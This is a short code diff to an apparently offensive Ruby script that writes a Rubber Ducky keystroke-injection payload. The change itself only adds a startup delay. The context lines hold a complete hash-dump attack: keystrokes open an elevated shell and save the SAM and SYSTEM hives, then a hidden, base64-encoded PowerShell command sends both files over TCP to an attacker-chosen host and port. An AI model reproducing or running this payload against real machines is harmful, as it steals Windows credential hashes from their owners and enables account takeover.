@@ -46,7 +46,7 @@ def ducky_setup(host,port)
   sys = 'c:\windows\temp\sys'
   powershell_command = %($sam_file=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("#{sam}"));$socket = New-Object net.sockets.tcpclient('#{host}',#{port.to_i});$stream = $socket.GetStream();$writer = new-object System.IO.StreamWriter($stream);$writer.WriteLine("sam");$writer.flush();$writer.WriteLine($sam_file);$socket.close();$socket = New-Object net.sockets.tcpclient('#{host}',#{port.to_i});$sys_file=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("#{sys}"));$stream = $socket.GetStream();$writer = new-object  System.IO.StreamWriter($stream);$writer.WriteLine("sys");$writer.flush();$writer.WriteLine($sys_file);$socket.close())
   encoded_command = Base64.encode64(powershell_command.encode("utf-16le")).delete("\r\n")
-  File.open("hashdump_tcp.txt","w") {|f| f.write("GUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 3000\nALT y\nDELAY 500\nSTRING #{save_sam}\nENTER\nSTRING #{save_sys}\nENTER\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
+  File.open("hashdump_tcp.txt","w") {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 3000\nALT y\nDELAY 500\nSTRING #{save_sam}\nENTER\nSTRING #{save_sys}\nENTER\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
 end
 def server(port)
   print_info("Starting Server!\n")
